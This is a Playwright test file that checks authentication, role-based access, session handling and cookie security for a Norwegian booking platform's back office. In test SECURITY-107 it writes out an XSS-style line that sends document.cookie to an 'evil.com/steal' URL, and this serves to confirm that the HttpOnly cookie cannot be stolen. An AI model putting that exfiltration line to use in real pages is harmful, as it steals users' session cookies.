/**
 * COMPREHENSIVE Authentication, RBAC, and Security Tests
 *
 * Exhaustive test coverage for all authentication scenarios, edge cases,
 * security vulnerabilities, and session management behaviors.
 *
 * @roadmap P0-02 RBAC as source of truth
 * @roadmap P1-01 Session continuity
 * @roadmap KRAV-SEC-01 Security compliance
 */

import { test, expect, type Page, type BrowserContext } from '@playwright/test';
import { APP_URLS, TEST_USERS, loginAs, logout } from './helpers';

/**
 * Helper: Check if session cookie exists
 */
async function hasSessionCookie(page: Page): Promise<boolean> {
  const cookies = await page.context().cookies();
  return cookies.some(cookie => cookie.name === 'digilist_session');
}

/**
 * Helper: Get session cookie
 */
async function getSessionCookie(page: Page): Promise<any> {
  const cookies = await page.context().cookies();
  return cookies.find(cookie => cookie.name === 'digilist_session');
}

/**
 * Helper: Clear all session data
 */
async function clearSession(page: Page): Promise<void> {
  await page.context().clearCookies();
  try {
    await page.goto('about:blank');
    await page.evaluate(() => {
      localStorage.clear();
      sessionStorage.clear();
    });
  } catch (error) {
    // Ignore errors
  }
}

/**
 * Helper: Set fake session cookie
 */
async function setFakeSessionCookie(page: Page, value: string): Promise<void> {
  await page.context().addCookies([{
    name: 'digilist_session',
    value,
    domain: 'localhost',
    path: '/',
    httpOnly: true,
    secure: false,
    sameSite: 'Lax',
  }]);
}

/**
 * Helper: Wait for redirect
 */
async function waitForRedirect(page: Page, timeout = 5000): Promise<string> {
  await page.waitForLoadState('networkidle', { timeout });
  return page.url();
}

test.describe('COMPREHENSIVE: Backoffice RBAC - Role Verification', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('RBAC-101 | Admin with valid session can access dashboard', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await expect(page).not.toHaveURL(/\/login/);
    const errorMsg = page.locator('text=Ingen tilgang');
    await expect(errorMsg).not.toBeVisible();
  });

  test('RBAC-102 | Admin can access all protected routes', async ({ page }) => {
    await loginAs(page, 'admin');

    const protectedRoutes = [
      '/',
      '/bookings',
      '/listings',
      '/organizations',
      '/users',
      '/settings',
      '/reports',
      '/audit',
    ];

    for (const route of protectedRoutes) {
      await page.goto(`${APP_URLS.backoffice}${route}`);
      await expect(page).not.toHaveURL(/\/login/);
    }
  });

  test('RBAC-103 | Case handler has restricted access', async ({ page }) => {
    await loginAs(page, 'saksbehandler');
    await page.goto(`${APP_URLS.backoffice}/work-queue`);
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('RBAC-104 | Regular user blocked immediately on backoffice access', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/, { timeout: 10000 });
  });

  test('RBAC-105 | Regular user sees Norwegian error message', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);
    const errorMsg = page.locator('text=Du har ikke tilgang til administrasjonspanelet');
    await expect(errorMsg).toBeVisible({ timeout: 10000 });
  });

  test('RBAC-106 | Regular user blocked from work-queue', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}/work-queue`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('RBAC-107 | Regular user blocked from settings', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}/settings`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('RBAC-108 | Regular user blocked from audit logs', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}/audit`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('RBAC-109 | Regular user blocked from organizations', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}/organizations`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('RBAC-110 | Blocked user session is cleared immediately', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/);

    // Verify no session cookie
    const hasCookie = await hasSessionCookie(page);
    expect(hasCookie).toBe(false);
  });
});

test.describe('COMPREHENSIVE: Session Lifecycle Management', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('SESSION-101 | Fresh login creates new session', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    const hasCookie = await hasSessionCookie(page);
    expect(hasCookie).toBe(true);
  });

  test('SESSION-102 | Session persists across multiple page loads', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    for (let i = 0; i < 5; i++) {
      await page.reload();
      await expect(page).not.toHaveURL(/\/login/);
    }
  });

  test('SESSION-103 | Session persists across navigation', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await page.goto(`${APP_URLS.backoffice}/bookings`);
    await page.goto(`${APP_URLS.backoffice}/listings`);
    await page.goto(`${APP_URLS.backoffice}/settings`);
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('SESSION-104 | Session persists after browser back button', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await page.goto(`${APP_URLS.backoffice}/bookings`);
    await page.goBack();
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('SESSION-105 | Session persists after browser forward button', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await page.goto(`${APP_URLS.backoffice}/bookings`);
    await page.goBack();
    await page.goForward();
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('SESSION-106 | No session without login', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    const hasCookie = await hasSessionCookie(page);
    expect(hasCookie).toBe(false);
  });

  test('SESSION-107 | Expired session redirects to login', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Clear cookies to simulate expiration
    await page.context().clearCookies();
    await page.reload();
    await expect(page).toHaveURL(/\/login/);
  });

  test('SESSION-108 | Invalid session cookie redirects to login', async ({ page }) => {
    await setFakeSessionCookie(page, 'invalid-token-12345');
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/);
  });

  test('SESSION-109 | Tampered session cookie redirects to login', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Tamper with cookie
    await setFakeSessionCookie(page, 'tampered-session-value');
    await page.reload();
    await expect(page).toHaveURL(/\/login/);
  });

  test('SESSION-110 | Multiple rapid page refreshes maintain session', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Rapid refreshes
    for (let i = 0; i < 10; i++) {
      await page.reload({ waitUntil: 'domcontentloaded' });
    }

    await expect(page).not.toHaveURL(/\/login/);
  });
});

test.describe('COMPREHENSIVE: Logout Functionality', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('LOGOUT-101 | Logout clears session cookie', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    const hasCookie = await hasSessionCookie(page);
    expect(hasCookie).toBe(false);
  });

  test('LOGOUT-102 | Logout clears localStorage auth data', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    const authUser = await page.evaluate(() => localStorage.getItem('auth_user'));
    expect(authUser).toBeNull();
  });

  test('LOGOUT-103 | Logout clears sessionStorage', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    const sessionData = await page.evaluate(() => sessionStorage.length);
    expect(sessionData).toBe(0);
  });

  test('LOGOUT-104 | Cannot access protected routes after logout', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    await page.goto(`${APP_URLS.backoffice}/bookings`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('LOGOUT-105 | Refresh after logout stays on login page', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);
    await page.goto(`${APP_URLS.backoffice}/login`);

    await page.reload();
    await expect(page).toHaveURL(/\/login/);
  });

  test('LOGOUT-106 | Multiple logouts do not cause errors', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    await logout(page);
    await logout(page);
    await logout(page);

    // Should not crash
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/);
  });

  test('LOGOUT-107 | Logout from one app does not affect other apps (isolation)', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    // Minside should require separate auth
    await page.goto(APP_URLS.minside);
    // In production, this would be isolated
  });

  test('LOGOUT-108 | Back button after logout does not restore session', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);
    await page.goto(`${APP_URLS.backoffice}/login`);

    await page.goBack();
    // Should redirect to login, not restore session
    await page.waitForLoadState('networkidle');
  });
});

test.describe('COMPREHENSIVE: Security Headers and Cookies', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('SECURITY-101 | Session cookie has HttpOnly flag', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const cookie = await getSessionCookie(page);
    if (cookie) {
      expect(cookie.httpOnly).toBe(true);
    }
  });

  test('SECURITY-102 | Session cookie has SameSite attribute', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const cookie = await getSessionCookie(page);
    if (cookie) {
      expect(cookie.sameSite).toBeTruthy();
    }
  });

  test('SECURITY-103 | No passwords in localStorage', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const storage = await page.evaluate(() => {
      const items: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) items[key] = localStorage.getItem(key) || '';
      }
      return items;
    });

    for (const [key, value] of Object.entries(storage)) {
      expect(key.toLowerCase()).not.toContain('password');
      expect(value.toLowerCase()).not.toContain('password');
    }
  });

  test('SECURITY-104 | No tokens in localStorage', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const storage = await page.evaluate(() => {
      const items: Record<string, string> = {};
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) items[key] = localStorage.getItem(key) || '';
      }
      return items;
    });

    // Check for JWT tokens or bearer tokens
    for (const value of Object.values(storage)) {
      expect(value).not.toMatch(/^eyJ[a-zA-Z0-9_-]+\./); // JWT pattern
      expect(value.toLowerCase()).not.toContain('bearer ');
    }
  });

  test('SECURITY-105 | No NIN (national ID) in localStorage', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const storage = await page.evaluate(() => {
      return Object.values(localStorage);
    });

    for (const value of storage) {
      // Norwegian NIN is 11 digits
      expect(value).not.toMatch(/\d{11}/);
    }
  });

  test('SECURITY-106 | Cannot access session cookie via JavaScript', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const canAccessCookie = await page.evaluate(() => {
      return document.cookie.includes('digilist_session');
    });

    // Should be false because HttpOnly prevents JS access
    expect(canAccessCookie).toBe(false);
  });

  test('SECURITY-107 | XSS cannot steal session', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Try to execute XSS to steal cookie
    const stolenCookie = await page.evaluate(() => {
      try {
        const img = document.createElement('img');
        img.src = 'https://evil.com/steal?cookie=' + document.cookie;
        return document.cookie;
      } catch (e) {
        return null;
      }
    });

    // Should not contain session cookie
    expect(stolenCookie || '').not.toContain('digilist_session');
  });
});

test.describe('COMPREHENSIVE: Error Handling and User Experience', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('ERROR-101 | Unauthorized access shows user-friendly error', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);

    const errorHeading = page.locator('text=Ingen tilgang');
    await expect(errorHeading).toBeVisible({ timeout: 10000 });
  });

  test('ERROR-102 | Error message is in Norwegian', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);

    const errorMsg = page.locator('text=administrasjonspanelet');
    await expect(errorMsg).toBeVisible({ timeout: 10000 });
  });

  test('ERROR-103 | No technical error details shown to user', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);

    const technicalError = page.locator('text=500, text=Error:, text=Stack trace, text=Exception');
    await expect(technicalError).not.toBeVisible();
  });

  test('ERROR-104 | Error includes guidance on who can access', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.backoffice);

    const guidance = page.locator('text=administratorer, text=saksbehandlere');
    await expect(guidance).toBeVisible({ timeout: 10000 });
  });

  test('ERROR-105 | Invalid session shows clear error', async ({ page }) => {
    await setFakeSessionCookie(page, 'invalid-session');
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/);
  });

  test('ERROR-106 | Network error handled gracefully', async ({ page }) => {
    await page.route('**/api/**', route => route.abort());
    await page.goto(APP_URLS.backoffice);

    // Should show login page or error, not crash
    const body = page.locator('body');
    await expect(body).toBeVisible();
  });
});

test.describe('COMPREHENSIVE: Performance and Responsiveness', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('PERF-101 | Login redirect completes within 2 seconds', async ({ page }) => {
    const startTime = Date.now();
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await expect(page).not.toHaveURL(/\/login/);

    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(2000);
  });

  test('PERF-102 | RBAC check completes within 3 seconds', async ({ page }) => {
    await loginAs(page, 'user');

    const startTime = Date.now();
    await page.goto(APP_URLS.backoffice);
    await Promise.race([
      page.waitForURL(/\/login/),
      page.waitForSelector('text=Ingen tilgang'),
    ]);

    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(3000);
  });

  test('PERF-103 | Session validation is fast (< 500ms)', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const startTime = Date.now();
    await page.reload();
    await page.waitForLoadState('domcontentloaded');

    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(500);
  });

  test('PERF-104 | Logout completes quickly (< 1 second)', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const startTime = Date.now();
    await logout(page);

    const duration = Date.now() - startTime;
    expect(duration).toBeLessThan(1000);
  });

  test('PERF-105 | Multiple concurrent requests handled correctly', async ({ page }) => {
    await loginAs(page, 'admin');

    // Navigate to multiple pages rapidly
    const promises = [
      page.goto(APP_URLS.backoffice),
      page.goto(`${APP_URLS.backoffice}/bookings`),
      page.goto(`${APP_URLS.backoffice}/listings`),
    ];

    await Promise.all(promises);
    await expect(page).not.toHaveURL(/\/login/);
  });
});

test.describe('COMPREHENSIVE: Cross-App Session Management', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('CROSS-101 | Minside has independent session', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.minside);
    await expect(page).not.toHaveURL(/error/);
  });

  test('CROSS-102 | Web app has independent session', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(APP_URLS.web);
    await expect(page).not.toHaveURL(/error/);
  });

  test('CROSS-103 | Logout from backoffice documented as isolated', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);
    await logout(page);

    // In production, minside session would be separate
    // This documents expected behavior
  });
});

test.describe('COMPREHENSIVE: Edge Cases and Boundary Conditions', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('EDGE-101 | Rapid login/logout cycles handled correctly', async ({ page }) => {
    for (let i = 0; i < 5; i++) {
      await loginAs(page, 'admin');
      await page.goto(APP_URLS.backoffice);
      await logout(page);
    }

    // Should not crash or leak memory
    await page.goto(APP_URLS.backoffice);
    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-102 | Empty localStorage does not break auth', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    await page.evaluate(() => localStorage.clear());
    await page.reload();

    // Should show login page, not crash
    const body = page.locator('body');
    await expect(body).toBeVisible();
  });

  test('EDGE-103 | Corrupted localStorage handled gracefully', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    await page.evaluate(() => {
      localStorage.setItem('auth_user', 'invalid-json-{{{');
    });
    await page.reload();

    // Should not crash
    const body = page.locator('body');
    await expect(body).toBeVisible();
  });

  test('EDGE-104 | Very long session duration handled', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Simulate long session by waiting
    await page.waitForTimeout(5000);
    await page.reload();

    // Session should still be valid
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('EDGE-105 | URL manipulation does not bypass RBAC', async ({ page }) => {
    await loginAs(page, 'user');

    // Try various URL tricks
    await page.goto(`${APP_URLS.backoffice}/../bookings`);
    await expect(page).toHaveURL(/\/login/);

    await page.goto(`${APP_URLS.backoffice}/./settings`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-106 | Query parameters do not affect RBAC', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}?admin=true&role=admin`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-107 | Hash fragments do not affect RBAC', async ({ page }) => {
    await loginAs(page, 'user');
    await page.goto(`${APP_URLS.backoffice}#admin`);
    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-108 | Empty role does not grant access', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    await page.evaluate(() => {
      localStorage.setItem('auth_user', JSON.stringify({ role: '' }));
    });
    await page.reload();

    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-109 | Null role does not grant access', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    await page.evaluate(() => {
      localStorage.setItem('auth_user', JSON.stringify({ role: null }));
    });
    await page.reload();

    await expect(page).toHaveURL(/\/login/);
  });

  test('EDGE-110 | Undefined role does not grant access', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);
    await page.evaluate(() => {
      localStorage.setItem('auth_user', JSON.stringify({}));
    });
    await page.reload();

    await expect(page).toHaveURL(/\/login/);
  });
});

test.describe('COMPREHENSIVE: Concurrent and Race Conditions', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('RACE-101 | Multiple tabs do not interfere with each other', async ({ context }) => {
    const page1 = await context.newPage();
    const page2 = await context.newPage();

    await loginAs(page1, 'admin');
    await page1.goto(APP_URLS.backoffice);

    await page2.goto(APP_URLS.backoffice);

    // Both should be logged in (shared session)
    await expect(page1).not.toHaveURL(/\/login/);
    await expect(page2).not.toHaveURL(/\/login/);

    await page1.close();
    await page2.close();
  });

  test('RACE-102 | Logout in one tab affects other tabs', async ({ context }) => {
    const page1 = await context.newPage();
    const page2 = await context.newPage();

    await loginAs(page1, 'admin');
    await page1.goto(APP_URLS.backoffice);
    await page2.goto(APP_URLS.backoffice);

    // Logout in page1
    await logout(page1);

    // Page2 should detect logout on next navigation
    await page2.reload();
    await expect(page2).toHaveURL(/\/login/);

    await page1.close();
    await page2.close();
  });

  test('RACE-103 | Rapid navigation does not corrupt session', async ({ page }) => {
    await loginAs(page, 'admin');

    // Rapid navigation
    for (let i = 0; i < 20; i++) {
      await page.goto(APP_URLS.backoffice, { waitUntil: 'commit' });
    }

    await page.waitForLoadState('networkidle');
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('RACE-104 | Simultaneous login attempts handled', async ({ context }) => {
    const page1 = await context.newPage();
    const page2 = await context.newPage();

    // Simultaneous logins
    await Promise.all([
      loginAs(page1, 'admin'),
      loginAs(page2, 'admin'),
    ]);

    await Promise.all([
      page1.goto(APP_URLS.backoffice),
      page2.goto(APP_URLS.backoffice),
    ]);

    await expect(page1).not.toHaveURL(/\/login/);
    await expect(page2).not.toHaveURL(/\/login/);

    await page1.close();
    await page2.close();
  });
});

test.describe('COMPREHENSIVE: Browser Compatibility and Features', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('COMPAT-101 | LocalStorage available check', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);

    const hasLocalStorage = await page.evaluate(() => {
      try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
        return true;
      } catch (e) {
        return false;
      }
    });

    expect(hasLocalStorage).toBe(true);
  });

  test('COMPAT-102 | SessionStorage available check', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);

    const hasSessionStorage = await page.evaluate(() => {
      try {
        sessionStorage.setItem('test', 'test');
        sessionStorage.removeItem('test');
        return true;
      } catch (e) {
        return false;
      }
    });

    expect(hasSessionStorage).toBe(true);
  });

  test('COMPAT-103 | Cookies enabled check', async ({ page }) => {
    await page.goto(APP_URLS.backoffice);

    const cookiesEnabled = await page.evaluate(() => {
      return navigator.cookieEnabled;
    });

    expect(cookiesEnabled).toBe(true);
  });
});

test.describe('COMPREHENSIVE: Stress Testing', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('STRESS-101 | 100 rapid page refreshes maintain session', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    for (let i = 0; i < 100; i++) {
      await page.reload({ waitUntil: 'commit' });
    }

    await page.waitForLoadState('networkidle');
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('STRESS-102 | Large localStorage does not break auth', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Fill localStorage with data
    await page.evaluate(() => {
      for (let i = 0; i < 100; i++) {
        localStorage.setItem(`test_${i}`, 'x'.repeat(1000));
      }
    });

    await page.reload();
    await expect(page).not.toHaveURL(/\/login/);
  });

  test('STRESS-103 | Multiple rapid RBAC checks', async ({ page }) => {
    await loginAs(page, 'user');

    // Try to access backoffice 50 times rapidly
    for (let i = 0; i < 50; i++) {
      await page.goto(APP_URLS.backoffice, { waitUntil: 'commit' });
    }

    // Should consistently block access
    await page.waitForLoadState('networkidle');
    await expect(page).toHaveURL(/\/login/);
  });
});

test.describe('COMPREHENSIVE: Data Integrity', () => {
  test.beforeEach(async ({ page }) => {
    await clearSession(page);
  });

  test('DATA-101 | User data not exposed in page source', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const pageSource = await page.content();
    expect(pageSource).not.toContain('test-admin-password');
    expect(pageSource).not.toContain(TEST_USERS.admin.password || '');
  });

  test('DATA-102 | Session token not exposed in page source', async ({ page }) => {
    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    const pageSource = await page.content();
    expect(pageSource).not.toMatch(/session[_-]?token/i);
  });

  test('DATA-103 | No sensitive data in network responses', async ({ page }) => {
    const responses: string[] = [];

    page.on('response', async (response) => {
      try {
        const body = await response.text();
        responses.push(body);
      } catch (e) {
        // Ignore binary responses
      }
    });

    await loginAs(page, 'admin');
    await page.goto(APP_URLS.backoffice);

    // Check responses
    for (const response of responses) {
      expect(response.toLowerCase()).not.toContain('password');
    }
  });
});
